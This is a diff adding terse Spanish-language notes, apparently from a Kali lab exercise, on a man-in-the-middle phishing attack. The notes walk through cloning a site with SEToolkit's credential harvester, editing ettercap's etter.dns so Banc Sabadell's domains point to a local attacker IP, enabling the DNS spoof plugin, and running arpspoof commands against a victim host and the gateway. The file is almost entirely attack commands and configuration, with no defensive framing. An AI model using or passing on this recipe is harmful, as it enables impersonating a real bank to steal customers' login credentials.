@@ -1,0 +1,63 @@
+# KALI
+
+1 services.sh
+
+ip a 
+
+ping 192.168.3.1 y 3.250
+
+host google.com
+
+SINO PONER EN RESOLV.CONF
+
+nameserver 192.168.3.250
+nameserver 8.8.8.8
+
+nameserver 127.0.0.53
+options edns0 trust-ad
+search cryptosec.net
+
+
+
+SETOOLKIT 
+
+1 engin
+
+2 WEBSITE ATTACK VECTORS
+
+3 CREDENTIAL HARVESTER
+
+2 site CLONER
+
+enter
+
+pegar la url
+
+probar en local en navegador poner IP y ver que funciona el CACHE POISON
+
+DNS SPOOF
+
+
+MODIFICAR /ETC/ETTERCAP/ETTER.DNS
+
+
+# Banc SABADELL
+www.bancsabadell.com    A       192.168.3.252
+bancsabadell.com        A       192.168.3.252
+*.bancsabadell.com      A       192.168.3.252
+
+ettercap --gtk
+
+--> PLUGINS --> MANAGE PLUGINS --> DNS_SPOOF DOBLE CLICK
+
+
+ARP SPOOF
+
+sudo arpspoof -i eth0 -t 192.168.3.109 192.168.3.1
+
+sudo arpspoof -i eth0 -t 192.168.3.1 192.168.3.109
+
+arp -a
+
+
+----
